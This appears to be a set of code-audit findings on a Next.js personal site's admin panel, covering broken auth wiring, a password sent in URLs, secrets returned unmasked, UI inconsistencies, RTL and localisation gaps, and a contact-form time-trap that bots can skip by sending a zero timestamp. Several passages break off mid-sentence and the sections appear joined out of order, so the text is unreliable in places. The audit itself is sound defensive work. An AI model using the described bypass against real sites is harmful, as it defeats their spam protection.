    - 9/33 calls have `catch {}` (empty body): TextEditor.tsx:20,
      ThemeBuilder.tsx:69/98, NavMenuManager.tsx:19, SettingsPanel.tsx:
      341/353, StatsDashboard.tsx:14, SecurityDashboard.tsx:14.
    - 12/33 calls have meaningful catch with user feedback. ✅
        AparatClipManager.tsx (3 calls), AccessUserManager.tsx (3 calls,
        except fetchLogs), SettingsPanel.tsx postJSON (10 sub-calls),
        user-dashboard/page.tsx:382/407.

D5. Loading state coverage
    - 5/33 calls have NO loading state at all (no useState for loading):
      TextEditor saveText, ThemeBuilder saveTheme/deleteTheme/toggle
      Theme, NavMenuManager save/del/toggle/move, AparatClipManager
      handleSubmit/handleDelete, AccessUserManager handleSubmit/
      handleDelete, SettingsPanel postJSON (all 10), user-dashboard
      sendReply/deleteMessage.
    - 6/33 calls have list-level loading only (loadItems pattern).
    - 22/33 calls have NO per-action loading — buttons clickable during
      in-flight request → double-POST risk.

D6. Backend endpoints with no frontend caller (dead backend)
    - /api/admin/chat-reply — chat-reply/route.ts exists but grep across
      /src returns zero callers. Orphan endpoint. (Future risk: an
      attacker discovering this endpoint could inject assistant messages
      into visitor chat sessions IF they had admin cookie — but admin
      cookie is required, so it's just unused, not vulnerable.)

D7. Frontend components with no mount point (dead frontend)
    - StatsDashboard.tsx — no import in /src.
    - SecurityDashboard.tsx — no import in /src.
    Both still ship in the bundle if imported by anything that tree-
    shakes poorly. They contain CRITICAL auth/security bugs (D1, D2)
    but are unreachable from the UI. Recommended: delete or rewrite
    using cookie-based auth.

================================================================================
SECTION E — CRITICAL END-TO-END BUGS (cross-cutting)
================================================================================

CRIT-A [HIGH, BROKEN-AUTH-DEAD-CODE] StatsDashboard + SecurityDashboard:
  Both components receive `password` as a prop and append it to URL/body.
  Both omit `credentials:"include"`. admin-auth.ts:17-31 (V17.2) reads
  ONLY the access_session cookie and IGNORES the password argument
  entirely. Therefore:
    - Every fetch from StatsDashboard → 401 unauthorized.
    - Every fetch from SecurityDashboard → 401 unauthorized.
  The components cannot work even if the admin typed the correct
  password. They are also not mounted anywhere in /src, so the issue is
  latent — but if any developer re-mounts them (e.g., re-enables the
  "stats" or "security" tabs in user-dashboard/page.tsx tabs array),
  they will fail silently with no error visible to the admin (because
  both have empty catch blocks).

  Cross-reference: worklog.md L69515 references V17.5-SEC-10 which
  touched bale webhook. Earlier V17.2 (admin-auth.ts:4-5) removed the
  password fallback. StatsDashboard/SecurityDashboard were not migrated
  and still operate in the pre-V17.2 password-fallback paradigm.

CRIT-B [HIGH, PWD-LEAK] StatsDashboard.tsx:11 + SecurityDashboard.tsx:
  :11/:26/:35 send admin's password in URL query string or POST body.
  Even though backend IGNORES the password, the secret is still:
    - in browser history (URL)
    - in NGINX/Next.js access logs (URL)
    - in any referrer header if user navigates to an external link from
      the panel
    - in any analytics/observability middleware that captures request
      bodies
  This is a credential leak with no functional benefit.

CRIT-C [MED, SILENT-FAILURE-PATTERN] Across 11 calls (see D3), the
  pattern `if (data.ok) { ... }` with no else branch is pervasive. When
  admin cookie expires mid-session, all subsequent saves/deletes/toggles
  silently no-op. The list reloads empty (401 on GET → empty array via
  catch), the admin sees a blank panel and assumes the data was wiped.
  There is no global 401 interceptor that would redirect to /user-login.

================================================================================
SECTION F — OBSERVATIONS (out of audit scope but notable)
================================================================================

O1 [MED] SettingsPanel.tsx:480 — `saveBale` calls `loadProviders()` after
     success. Should be `loadSettings()`. Refreshes AI providers list,
     not bale settings form. Cosmetic — save itself works.

O2 [LOW] AccessUserManager.tsx:155 — `password: form.password || undefined`
     for POST create. On PUT (edit), form.password is "" when admin didn't
     type a new password. Backend users/[id]/route.ts:67 only hashes if
     length ≥6, so empty string is ignored. ✅ Correct UX.

O3 [LOW] user-dashboard/page.tsx:366-377 — `fetch("/api/messages").then
     (r => r.json())` — NO catch on the .then chain. Network error
     during initial load = unhandled promise rejection. (Actually the
     .catch at L375 IS there. ✅ Re-verified — OK.)

O4 [LOW] ThemeBuilder.tsx:88 — `payload.data = { ...t }` spreads the
     whole ThemeColors object including `id` (then deleted at L86).
     For "update" action, backend themes/route.ts:77-79 also defensively

O5 [LOW] AparatClipManager.tsx:62-65 — body includes `id: editing?.id`
     even on create (undefined). Backend clips/route.ts:38-50 ignores

O6 [LOW] SettingsPanel.tsx postJSON helper returns `Promise<{ok:boolean;
     error?:string}>` but `data.error` may be undefined when ok:true.
     Callers do `result.error || ""`. ✅

O7 [LOW] user-dashboard/page.tsx:98 — `/api/user/verify` is correctly

O8 [LOW] StatsDashboard.tsx and SecurityDashboard.tsx both receive `lang`

     React state and any error boundaries / devtools.

1. personal.css imported globally?  ✅ YES.

   Order: globals.css first (just `@import "tailwindcss"`), then personal.css —
   so personal.css overrides Tailwind base. V17.4 fix holds. page.tsx:5 also
   imports personal.css (harmless duplicate — Next.js dedupes CSS imports by
   path; both produce the same `<link>`).

2. user-dashboard uses CSS classes?  ✅ YES, consistently.
   Every element uses `.dashboard-*` classes (dashboard-shell, -container,
   -header, -title, -subtitle, -actions, -btn, -select, -access-warning,
   -tabs, -tab, -content, -info-grid, -info-card, -info-label, -info-value,
   -help-box, -loading, -messages-list, -message-card, -message-header,
   -message-name, -message-email, -message-date, -message-text,
   -message-replies, -message-reply-text, -message-actions, -reply-form,
   -reply-textarea, -empty-state). Loading state is text-only ("Loading"
   with blinking `_` cursor) — no skeleton (see Q10).

3. SettingsPanel beautiful?  ⚠️ MOSTLY — best of the four child panels.
   Strengths:
     - Uses a cohesive `.settings-*` design system (card, row, field,
       label, input, select, btn, btn-small, btn-icon, hint,
       checkbox-row, checkbox-label, toast, providers-list,
       provider-item, provider-editor, help-list).
     - Cards have hover border-brighten (settings-card:hover).

       inputs for FA fields set `dir="rtl"` individually).

     - Help-card with `## ` prefix decoration on title.
   Weaknesses (beauty issues):

14. RTL support?  ⚠️ PARTIAL.
    - `layout.tsx:112` — `<html lang="en" dir="ltr" suppressHydrationWarning>`
      HARDCODED. Initial server render is LTR for everyone. Persian

      = "rtl"` (user-dashboard:96, 119; SettingsPanel:276, 290).

    - SettingsPanel:566 — `dir={panelLang === "fa" ? "rtl" : "ltr"}`
      on root div. Inputs for FA fields set `dir="rtl"` individually

      on `panel_lang` localStorage.
    - AccessUserManager: NO `dir` attribute on root. NO `dir` on

    - ContentManager: NO `dir` attribute on root. NO RTL handling.
    - ThemeBuilder: NO `dir` attribute on root. Uses `marginLeft: 8`

    - global-error.tsx:11 — `<html lang="fa" dir="rtl">` hardcoded
      Persian — English/German users see Persian error page on
      critical errors.

15. Responsive?  ⚠️ MIXED.
    - personal.css media queries (7 total):
      * `@media (max-width: 900px)` (line 1343)
      * `@media (max-width: 720px)` (lines 1355, 1413, 2111, 2412)
      * `@media (max-width: 768px)` (lines 3111, 3127, 3241)
      * `@media (max-width: 600px)` (lines 2833, 3287)
      * `@media (max-width: 480px)` (line 1388)
      * `@media (prefers-reduced-motion: reduce)` (lines 1395, 1463,
        3487)
    - `.dashboard-shell` collapses padding 16→8 at 768px.
    - `.dashboard-container` collapses padding 24→16 at 768px.
    - `.dashboard-tabs` switches from `flex-wrap` to `overflow-x:
      auto` at 768px (horizontal scroll).
    - `.dashboard-info-grid` collapses 2→1 column at 600px.
    - `.settings-row` collapses 2→1 column at 600px.
    - BUT:
      * ContentManager button row uses inline `flexWrap: "wrap"` —
        no breakpoint, buttons reflow freely.
      * ContentManager item list uses `.admin-messages` (grid gap,
        no breakpoint).
      * ThemeBuilder editor grid `gridTemplateColumns: "1fr 1fr"`
        (line 139) — NO breakpoint. On mobile (<600px), color inputs
        shrink to ~50% width, text overflow.
      * ThemeBuilder theme grid `repeat(auto-fill, minmax(200px, 1fr))`
        (line 245) — 200px min forces 1 column on small phones,
        huge whitespace.
      * AccessUserManager form grid `gridTemplateColumns: "1fr 1fr"`
        (line 335) — NO breakpoint. Hour-start/End fields shrink on
        mobile.
      * AccessUserManager table: `overflowX: "auto"` (line 474) —
        horizontal scroll on mobile, but 9 columns at 11px font is
        unreadable even scrolled.
      * AccessUserManager logs table: `maxHeight: 500, overflowY: "auto"`
        (line 240) — fine on desktop, awkward on mobile (small
        viewport + nested scroll).
    - NO mobile-specific navigation (no hamburger, no drawer). The 10
      dashboard tabs scroll horizontally on mobile but are not iconic
      (only emoji + text labels).
    - NO touch-friendly tap targets: most buttons are 24-32px tall,
      below Apple's 44px and Material's 48px recommendations.

================================================================
TOP 10 BEAUTY ISSUES (ranked by user-facing impact)
================================================================

1. ❌ CRITICAL — Four parallel button systems in the same admin panel.
   Sources:
     - `.btn`, `.btn-primary`, `.btn-ghost`, `.btn-sm` (legacy, used by
       ContentManager:194-229, ThemeBuilder:126,181,184,277,281,285)
     - `.settings-btn`, `.settings-btn-small` (SettingsPanel only,
       personal.css:2887-2938)
     - `.dashboard-btn` (user-dashboard only, personal.css:3168-3197)
     - `.signal-waveform-btn` (AccessUserManager only,
       personal.css:2214-2227)
   Impact: adjacent tabs (Settings → Content → Users) render buttons
   with different padding (10/5/8/6px), border-radius (6/4/6/4px),
   and hover effects (background-change vs border-brighten). The
   admin perceives the panel as assembled from 4 different
   templates. Fix: unify all panel buttons on a single `.panel-btn`
   + `.panel-btn--primary/-ghost/-danger/-sm/-icon` BEM-style
   system; deprecate `.btn`, `.settings-btn`, `.dashboard-btn`,
   `.signal-waveform-btn` (keep as aliases for backward-compat).

2. ❌ CRITICAL — Three parallel input systems.
   Sources:
     - `.settings-input` — `padding: 9px 12px`, `font-size: 13px`,
       `border-radius: 6px`, focus ring (personal.css:2853-2876)
     - AccessUserManager `inputStyle` — `padding: 8px 10px`,
       `font-size: 12px`, `border-radius: 4px`, no focus ring
       (AccessUserManager:543-554)
     - ContentManager/ThemeBuilder inline — `padding: 6px` or
       `padding: 4px`, `font-size: 0.8rem/0.72rem`, `border-radius: 0`,
       no focus ring
   Impact: form fields look 4 different ways in 4 adjacent tabs.
   Height is inconsistent (28-32-36px), which makes vertical
   alignment of label+input+button rows impossible. Fix: unify on
   `.panel-input` with size modifiers.

3. ❌ HIGH — ContentManager has NO i18n despite receiving `lang` prop.
   Buttons "+ add", "bulk import", "save", "cancel", "edit", "show",
   "hide", "delete", "loading...", "No items yet.", "JSON array of
   items:", "import", "Must be JSON array", "Imported N of M",
   "Invalid JSON" — all hardcoded English. Fix: add a `T` object
   like SettingsPanel's (fa/en/de) with all strings.

4. ❌ HIGH — AccessUserManager doesn't receive `lang` prop from
   dashboard. user-dashboard.tsx:320 — `<AccessUserManager />`
   (no lang passed). All UI text (form labels, table headers,
   button labels, error messages, confirm dialogs) is hardcoded
   Persian. Fix: pass `lang={lang}` and add i18n.

5. ❌ HIGH — NO loading skeletons anywhere. All 5 loading states
   are plain text:
     - dashboard-loading: "Loading" + blinking `_` cursor
     - settings-loading: "در حال بارگذاری..."
     - ContentManager: "loading..." (inline `<p>`)
     - ThemeBuilder: "loading..." (inline `<p>`)
     - AccessUserManager: "در حال بارگذاری کاربران..." (inline `<div>`)
   Fix: add `.panel-skeleton`, `.panel-skeleton-card`,
   `.panel-skeleton-line`, `.panel-skeleton-avatar` classes with a
   `shimmer` keyframe animation. Use them in all 5 loading states.

6. ❌ HIGH — Native `alert()` / `confirm()` used in 5 components.
   Sources:
     - ContentManager: alert × 3 (lines 107, 116, 119), confirm × 1 (84)
     - AccessUserManager: alert × 2 (213, 216), confirm × 1 (201)
     - ThemeBuilder: confirm × 1 (102)
     - AparatClipManager: alert × 1 (99), confirm × 1 (89)
     - NavMenuManager: confirm × 1 (47)
     - SecurityDashboard: confirm × 1 (34)
     - SettingsPanel: confirm × 1 (545)
     - user-dashboard MessagesPanel: confirm × 1 (405)
   Impact: browser chrome interrupts the panel's visual flow;
   alert/confirm text can't be styled, can't be RTL-aware (browser
   renders them LTR even in Persian mode), can't be ARIA-live.
   Fix: replace with a `<Modal>` component + a global toast system.

7. ❌ HIGH — NO global toast system. Only SettingsPanel has its own
   `.settings-toast`. ContentManager uses alert(). AccessUserManager
   uses inline error box. ThemeBuilder swallows errors silently
   (catch{}). User-dashboard MessagesPanel uses `.dashboard-access-
   warning` with inline red overrides.
   Fix: introduce a `<ToastProvider>` + `useToast()` hook + portal-
   rendered `.toast-container` (top-right or bottom-center) with
   success/error/warning/info variants, auto-dismiss, manual
   dismiss, queue, swipe-to-dismiss, ARIA-live.

8. ❌ MEDIUM — ThemeBuilder editor grid is NOT responsive.
   `gridTemplateColumns: "1fr 1fr"` (line 139) — hardcoded. On
   mobile (<600px), color inputs + live preview shrink to ~50%,
   causing text overflow and horizontal scroll. The `.settings-row`
   has `@media (max-width: 600px) { grid-template-columns: 1fr }`
   but ThemeBuilder's inline grid doesn't.
   Fix: replace inline grid with `.settings-row` class, OR add
   `@media (max-width: 600px) { grid-template-columns: 1fr !important }`
   to a `.theme-editor-grid` class.

9. ❌ MEDIUM — Typography hierarchy broken.
   - dashboard-info-label: 9px (personal.css:3301) — below WCAG
     12px minimum.
   - AccessUserManager `<th>`: 10px (thStyle:559) — below minimum.
   - AccessUserManager `<small>`: 10px (lines 347, 360, 379, 408,
     422) — below minimum.
   - ThemeBuilder theme card "btn" preview: 9.6px (line 264) —
     unreadable.
   - Heading order: h1 (dashboard-title) → h3 (AccessUserManager
     headings) — SKIPS h2. h1 → h4 (SettingsPanel card titles,
     ThemeBuilder preview heading) — SKIPS h2, h3.
   Fix: bump all 9-10px labels to 11px minimum; demote
   AccessUserManager h3 → h2; demote SettingsPanel h4 → h3;
   add h2 sections inside tabs.

10. ❌ MEDIUM — Empty states are weak and inconsistent.
    - SettingsPanel `.settings-empty`: italic dim text, "No
      providers configured." English-only.
    - user-dashboard `.dashboard-empty-state`: italic dim text,
      trilingual.
    - ContentManager: plain `<p>No items yet.</p>` (no class).
    - ThemeBuilder: plain `<p>No custom themes yet...</p>` (no class).
    - AccessUserManager: plain `<td>` in table (no class).
    NO icons. NO illustrations. NO call-to-action buttons. NO
    "create your first X" guidance.
    Fix: introduce `.panel-empty-state` with optional icon slot,
    heading, subtext, and CTA button. Apply to all 5 empty states.

================================================================
HONORABLE MENTIONS (issues 11-15, not in top 10 but worth noting)
================================================================

11. ThemeBuilder provides NO feedback on save/delete/toggle failures
    — every async function ends with `catch {}` silently (lines 98,
    109, 118). User clicks "save", nothing happens, no toast, no
    error message. Fix: surface errors via the global toast system
    (issue #7).

12. ThemeBuilder shows NO "active theme" indicator — admin cannot
    tell which theme is currently applied to the live site. Fix:
    add `.theme-card.active` class with a "● Active" badge.

13. AccessUserManager form is rendered as a full-page replacement
    (no modal overlay, no backdrop, no scroll-lock, no Escape-to-
    close, no animation). Admin loses the list context when editing.
    Fix: render the form as a `.panel-modal` overlay.

14. AccessUserManager table headers `textAlign: "right"` hardcoded
    (line 477) and logs table `textAlign: "left"` hardcoded (line
    244) — neither respects RTL/LTR switching. Fix: use logical
    properties `text-align: start` / `text-align: end`, or use a
    `dir`-aware class.

15. Initial server-render `<html lang="en" dir="ltr">` (layout.tsx:112)
    is hardcoded — Persian users see LTR flash (FOUC) before client
    JS sets `dir="rtl"`. Fix: read `panel_lang` from cookie (not
    localStorage) in a server component, or use a no-JS `<script>`
    in `<head>` that sets `dir` before hydration (similar to the
    existing font-picking script at layout.tsx:115-126).

Final verdict:
  Q1 ✅, Q2 ✅ — V17.4 fix holds; user-dashboard is class-consistent.
  Q3 ⚠️ — SettingsPanel is the gold standard but has minor gaps.
  Q4, Q5, Q6 ❌ — ContentManager, AccessUserManager, ThemeBuilder
                  are all visually inconsistent with SettingsPanel
                  and with each other (3 different button systems,
                  3 different input systems, 3 different card
                  systems, 3 different empty states, 3 different
                  loading states).
  Q7, Q8, Q9 ⚠️ — Color/spacing/typography tokens exist in
                  personal.css but inline-styled components bypass
                  them.
  Q10 ❌ — NO loading skeletons anywhere.
  Q11 ⚠️ — Error pages exist but inline-styled and Persian-only.
            ContentManager and ThemeBuilder swallow errors silently.
  Q12 ⚠️ — Empty states are weak (plain text, no icons/CTAs).
  Q13 ⚠️ — Only SettingsPanel has a toast; NO global toast system.
  Q14 ⚠️ — RTL partially supported; FOUC on initial render; some
            components bypass RTL entirely.
  Q15 ⚠️ — Dashboard and settings responsive; ThemeBuilder and
            AccessUserManager inline grids are NOT responsive.

Cross-references to prior findings (worklog):
  - V17.4-PANEL-* (personal.css global import) — confirmed ✅.
    This audit found NO remaining panel that fails to import
    personal.css.
  - V17.1 (admin panel redesign) — the .dashboard-* and .settings-*
    systems were introduced here. The legacy `.btn`, `.admin-*`,
    `.signal-waveform-btn` classes are leftovers from pre-V17.1
    code that should be deprecated.
  - V17.5-SEC-12 (chat subsystem security audit) — that audit found
    ContentManager.tsx and ThemeBuilder.tsx use `catch {}` blocks
    that swallow errors silently. This beauty audit confirms the
    SAME pattern affects the user-facing UX (admin gets no feedback

----- O-1. VERSION.txt and package.json don't say V17.4  [LOW] -----

    + tutorial filename on next release so audit trails are
    consistent. NOT a blocker — install works regardless.

----- O-2. Standalone server.js does NOT load .env  [MED — setup gotcha] -----
  - server.js does not import `dotenv` or any env loader.
  - .env is parsed only by some seed scripts (which read DB
    path from __file__, not env) — NOT by the running server.
  - In production this is fine because install.sh sets up a
    systemd unit with EnvironmentFile=/path/to/.env, which
    injects the vars into the process environment before exec.
  - In a manual / dev / test install that ONLY writes .env and
    then runs `node server.js`, SESSION_SECRET will be undefined
    and the access-auth lib will either:
      (a) crash on first session operation if it doesn't lazy-load,
      (b) use a fallback if V17.3's "lazy-load" branch kicks in
          (per VERSION.txt: "SESSION_SECRET lazy-loaded (build
          بدون env کار می‌کنه)").
  - Workaround: ALSO export the env vars in the shell that
    launches node, OR add `require('dotenv').config()` to
    server.js (would add a dotenv dep — currently not in
    package.json, would need to be bundled).
  - This was confirmed in test: .env had HOSTNAME="127.0.0.1"
    but server bound to 0.0.0.0 (the server.js fallback).

----- O-3. /api/login and /api/access/login don't exist  [LOW] -----
  - Tested 4 login endpoint candidates:
      /api/user/login    → 200 ✅ (the real one)
      /api/login         → 404 (not registered)
      /api/admin/login   → 401 (exists but is a session-check
                              endpoint, not a login endpoint)
      /api/access/login  → 404 (not registered)
  - The endpoint name /api/user/login is NOT documented in
    VERSION.txt's "ورود ادمین" section (it just says
    "http://YOUR_IP:3000/user-login" — the page, not the API).
  - Anyone trying to script a login by guessing the API path
    from the page path (/user-login → /api/login) will fail.
  - Recommend: document the API path /api/user/login in
    README.md or VERSION.txt for integrators.

----- O-4. /api/admin/login returns 401 without a session  [LOW] -----
  - The endpoint exists (middleware let the request through
    after CSRF passed), but it returned 401 unauthorized.
  - This means /api/admin/login is a session-CHECK endpoint
    (returns 401 if no session, presumably 200 + user object
    if session is valid), NOT a credential-accepting endpoint.
  - Not a bug — just naming ambiguity. The credential-
    accepting login is /api/user/login; /api/admin/login is
    the session-check variant. Confusingly similar names.

----- O-5. /api/admin/settings returns secrets in cleartext  [LOW-MED] -----
  - Response shape includes: baleBotToken, telegramBotToken,
    baleChatId, telegramChatId.
  - In this test they were all empty strings (no config yet),
    but the API does NOT mask them — if non-empty, they would
    be returned in cleartext.
  - Mitigating factors:
      (a) Endpoint requires admin session (middleware).
      (b) Only the site admin can read it.
  - But defense-in-depth says: bot tokens are long-lived
    secrets and shouldn't be re-transmitted on every GET.
    Recommend: return a masked preview like "••••…1234" and
    require a separate /api/admin/secrets endpoint with
    re-auth (currentPassword) for full values.

    (نه همیشه true)" — Secure is conditional on TLS.
  - In production behind Caddy/nginx with HTTPS, Secure would
    be set. ✅ Correct behavior.

7. Contact form with honeypot + time-trap (V17.4 fixed time-trap)?
   [PASS for shape, with one bypass edge case]
----------------------------------------------------------------
Honeypot field (page.tsx:768-775):
  - `<input type="text" name="website" tabIndex={-1} autoComplete="off"
    style={{ position:"absolute", left:"-9999px", top:"auto",
    width:1, height:1, overflow:"hidden" }} aria-hidden="true" />`
  - Off-screen positioning + 1×1 size + tabIndex=-1 + aria-hidden.
    ✅ Bots that auto-fill all form fields will populate `website`;
    humans won't see or tab to it.
  - Submitted to API at page.tsx:367 `website: (e.target as
    HTMLFormElement).website?.value || ""`.
  - API handling (api/contact/route.ts:81-87): if `website` is
    non-empty, log `honeypot_triggered` security event + return
    `{ ok: true }` (silent success — bot doesn't know it was caught).
    ✅ Good UX: bots get a fake success, real users never see the
    honeypot.

Time-trap field (page.tsx:776-777, 80, 84):
  - `<input type="hidden" name="_t" value={formLoadTime} />`
  - State declared at page.tsx:80: `const [formLoadTime,
    setFormLoadTime] = useState(0)` — initial value 0.
  - V17.4 fix: setFormLoadTime is called ONCE in the mount
    useEffect at page.tsx:84 `setFormLoadTime(Date.now())` — NOT
    on every render. This was the V17.4 fix (per worklog:63067):
    previously the time-trap was set inline on every render,
    which meant every re-render reset the "form load time", so
    even slow human submissions could be rejected as "too fast".
    ✅ Fix verified — `useEffect(() => { ...; setFormLoadTime
    (Date.now()); ... }, [])` with empty dependency array runs
    exactly once on mount.
  - Submitted to API at page.tsx:369: `_t: (e.target as
    HTMLFormElement)._t?.value || Date.now()`. The fallback
    `|| Date.now()` is suspicious — see edge case below.
  - API handling (api/contact/route.ts:88-93):
      const submittedAt = Number(body._t || 0);
      if (submittedAt && Date.now() - submittedAt < 2000) {
        // reject as too_fast
      }
    If form was submitted <2s after the page loaded, rejected
    with `error: "too_fast"`. ✅ Correct.

V17.4 time-trap fix verification — PASS:
  - useState pattern at page.tsx:80 ✅
  - One-shot useEffect at page.tsx:84 with empty deps array ✅
  - The hidden field reads `value={formLoadTime}` (page.tsx:777)
    which is the React state — re-renders DO update the field
    value, but since setFormLoadTime is only called once, the
    value stabilizes after mount. No longer resets on every
    re-render. ✅

Edge case (time-trap bypass — LOW severity):
  - Between the first paint and useEffect firing, `formLoadTime
    === 0` (initial state). The hidden input renders with
    `value={0}`, i.e. `_t="0"`.
  - The page.tsx:369 fallback `(e.target as HTMLFormElement)._t?
    .value || Date.now()` — `"0" || Date.now()` evaluates to
    `"0"` (string `"0"` is truthy in JS). So the body sends
    `_t: "0"`.
  - API does `Number(body._t || 0)` = `Number("0" || 0)` =
    `Number("0")` = `0`. Then `if (submittedAt && ...)` — `0`
    is falsy → time-trap check SKIPPED entirely.
  - Net effect: if a headless browser loads the page and submits
    the form BEFORE useEffect runs (typically <16ms after first
    paint), the time-trap is bypassed. In practice, no human can
    type and submit a form in <16ms; the bypass only benefits
    bots that explicitly exploit this race.
  - Also: a bot that directly POSTs to /api/contact (skipping
    the page entirely) can just omit `_t` or send `_t: 0` →
    same bypass. The time-trap is only effective against bots
    that DO render the page AND wait for useEffect.
  - This is a pre-existing design limitation, not a regression
    from V17.4. The V17.4 fix correctly addressed the
    "legit-form-rejection" bug; the bypass was always there.

Other contact form findings:
  - reCAPTCHA widget (page.tsx:794-802): renders `g-recaptcha`
    div with `data-sitekey={process.env.NEXT_PUBLIC_RECAPTCHA_
    SITEKEY || ""}` AFTER mount (gated by `mounted` state to
    avoid hydration mismatch per page.tsx:72-77 comment). If
    env var is unset, sitekey is empty string → reCAPTCHA widget
    doesn't render → form can't be submitted (line 350-355
    checks `grecaptcha.getResponse()` returns falsy → error).
    Hard-fail-closed by design.
  - Form labels: page.tsx:779-788 each `<label htmlFor="...">`
    correctly matches the `<input id="...">` (name, email,
    message). ✅ The reCAPTCHA `<label>` at page.tsx:791 has NO
    htmlFor (because the reCAPTCHA widget manages its own
    a11y) — acceptable.
  - Form labels use `tt.contact.form.name` etc. (localized).
    ✅ Except line 791 `{lang === "fa" ? "تأیید ربات" : "Robot
    check"}` — hardcoded binary ternary, no German translation
    (German users see "Robot check"). See criterion 9.
  - maxLength on inputs (page.tsx:780 name=100, 784 email=200,
    788 message=5000). API also slices (api/contact/route.ts:
    77-79). ✅ Defense-in-depth.
  - Form status <p role="status"> at page.tsx:807 ✅ — screen
    readers announce form submission results.
  - noValidate on form (page.tsx:766) — disables browser
    native validation, relies on JS validation. Acceptable
    for a JS-required form.

Verdict: PASS — honeypot ✅, time-trap ✅ (V17.4 fix verified
  in place at page.tsx:80, 84, 777). One LOW-severity time-trap
  bypass exists for pre-useEffect submissions, but this is a
  design limitation, not a regression. reCAPTCHA is mandatory
  and fail-closed.

    → 1 col. footer-inner → column. ✅
  - max-width: 480px (personal.css:1388): container padding
    16px, hero-cta → column, btn → 100% width. ✅
  - prefers-reduced-motion (personal.css:1395): all animations
    reduced to 0.01ms. ✅ Accessibility win.
  - RTL adjustments (personal.css:1408-1411, 1413-1419):
    nav-links direction, about-stats ::before, skill-card
    ::before, book-cover ::after, footer-admin direction.
    Also at <=720px the drawer slides in from the LEFT for
    RTL. ✅
  - Tutorial modal (personal.css:1037-1094): position fixed
    inset:0, padding 20px, max-width 900px, max-height 90vh,
    aspect-ratio 16/9 on video. Scales down on mobile.
    ✅ No specific <=720px override for the modal, but
    aspect-ratio + max-width handle it.
  - Tutorial modal bar (personal.css:1058-1067): flex with
    space-between, no overflow handling. Long titles (e.g.
    "Tutorial Four — Project · 38:20 · Intermediate" at
    content.ts:274-281) could wrap or stretch the bar on
    narrow viewports. Minor.
  - Clips grid (page.tsx:710): inline style `display:grid,
    gap:24` — no responsive columns. Each clip is a full-width
    card. Acceptable for video embeds.
  - reCAPTCHA widget (page.tsx:794-799): the placeholder div
    at line 801 is hardcoded `width: 304, height: 78`. The
    actual reCAPTCHA widget is 304px wide — fits most phones
    (iPhone SE = 375px). But on a 320px viewport (older
    iPhone 5), it'd overflow horizontally. No overflow-x:
    auto wrapper.

Mobile navbar crowding concern:
  - On <=720px, nav-links becomes a slide-in drawer, BUT
    the nav-right (page.tsx:512-541) STILL contains:
    theme-switcher (7 color-dot buttons, ~80-100px wide per
    personal.css:2057-2089) + lang-toggle (3 buttons ~80px
    wide per personal.css:431-455) + nav-toggle hamburger.
  - The brand-name (page.tsx:471) is on the left. Total:
    brand (~80px) + nav-right (~200px) = ~280px minimum
    width. Fits 320px viewport but barely — no specific
    <=480px rule for nav-right. Theme-switcher's 7 dot
    buttons could wrap or overflow if brand is long.
  - No `display: none` for theme-switcher on mobile —
    unlike nav-links (which becomes a drawer), the theme
    and lang toggles stay visible at all breakpoints.

Hero visual ordering:
  - On <=900px, hero-visual gets `order: -1` (personal.css:
    1345) — visual appears ABOVE hero-text on mobile. ✅
    Good for showing the InteractiveTerminal first.

Verdict: PASS — responsive coverage at 900/720/480px +
  prefers-reduced-motion + RTL adjustments. Two minor
  concerns: (a) reCAPTCHA fixed 304px width risks overflow
  on <=320px viewports; (b) mobile navbar may crowd with
  theme-switcher + lang-toggle both visible. Neither blocks
  functionality.


9. Hardcoded strings?  [PARTIAL FAIL — 6 de-localization gaps]
----------------------------------------------------------------
The page uses `tx(key, fallback)` (page.tsx:107) for DB-driven
text with content.ts fallback, AND `tt.*` (page.tsx:105) for
static UI strings. Most visible text is localized. But several
strings are hardcoded inline:

STATUSBAR (page.tsx:441-465) — RF decoration, all hardcoded:
  - page.tsx:445 `online` — status label
  - page.tsx:449 `-67dBm` — signal strength (fake value)
  - page.tsx:452 `2.4GHz` — frequency (fake value)
  - page.tsx:457 `{lang === "fa" ? "زمان:" : "time:"}` —
    inline ternary, NO German translation (de users see "time:")
  - page.tsx:462 `/dev/pts/0` — tty path (decorative)
  These are decorative "RF vibe" elements — leaving them
  un-localized is arguably intentional. The "time:" label
  ternary at line 457 is the only one with a real text label
  and it's en/fa only.

CLIPS SECTION (page.tsx:698-737):
  - page.tsx:701 `07 — clips` — section eyebrow, hardcoded
    English (compare with `tt.tutorials.num` at line 681
    which IS localized)
  - page.tsx:702 `{lang === "fa" ? "ویدیوها" : "Clips"}` —
    NO German translation
  - page.tsx:703 `{lang === "fa" ? "// ویدیوهای آموزشی" :
    "// educational videos"}` — NO German translation
  - page.tsx:707 `{lang === "fa" ? "هنوز ویدیویی اضافه
    نشده." : "No clips yet."}` — NO German translation
  These should use `tt.clips.*` (which doesn't exist in
  content.ts — the clips section is not in the UI object
  at content.ts:295-644). Missing UI schema entry.

CONTACT FORM (page.tsx:791):
  - page.tsx:791 `{lang === "fa" ? "تأیید ربات" : "Robot
    check"}` — NO German translation. Should be in
    `tt.contact.form.robotCheck` (also missing from
    content.ts).

CONTACT FORM (page.tsx:352):
  - page.tsx:352 `setFormStatus({ text: lang === "fa" ?
    "لطفاً تأیید ربات را انجام دهید." : "Please complete
    the robot check.", ...})` — NO German translation.
    Inline ternary in JS handler.

THEME-SWITCHER (page.tsx:514-520):
  - All 7 theme button titles are English-only:
    "Terminal (green/black)", "Midnight (blue)", "Amber
    (retro CRT)", "Cyan (cyberpunk)", "Purple (neon)",
    "Solarized", "Clean (light)".
  - These are `title` attributes, not rendered text, so
    the visible UI is unaffected. But screen readers + the
    tooltip are English-only.

LANG-TOGGLE (page.tsx:528):
  - `aria-label={`Switch to ${l}`}` — always English.

NAV-TOGGLE (page.tsx:536):
  - `aria-label="Toggle menu"` — always English.

ANTI-THEFT WARNING (page.tsx:427-438):
  - page.tsx:430 `<h2>⚠ DevTools Detected</h2>`
  - page.tsx:431 `This site is protected against template
    theft.`
  - page.tsx:432 `Please close the developer tools to
    continue browsing.`
  - page.tsx:433-435 `If you're the owner, you can disable
    this in page.tsx → anti-theft useEffect.`
  All English-only. Acceptable since this is a developer-
  facing anti-theft message, but inconsistent with the
  site's trilingual design.

DOMAIN-LOCK MESSAGE (page.tsx:147-164):
  - All English-only inside a template string. Same as
    anti-theft: developer-facing message.

FOOTER ADMIN LINK (page.tsx:823-830):
  - page.tsx:826 `title="Ctrl+Shift+A"` — always English
    tooltip. The link has NO `href` and NO `onClick` —
    it's a dead anchor (clicking does nothing). The Ctrl+
    Shift+A keyboard shortcut it advertises is NOT
    implemented anywhere in src/ (verified by Grep for

Summary of localization gaps:
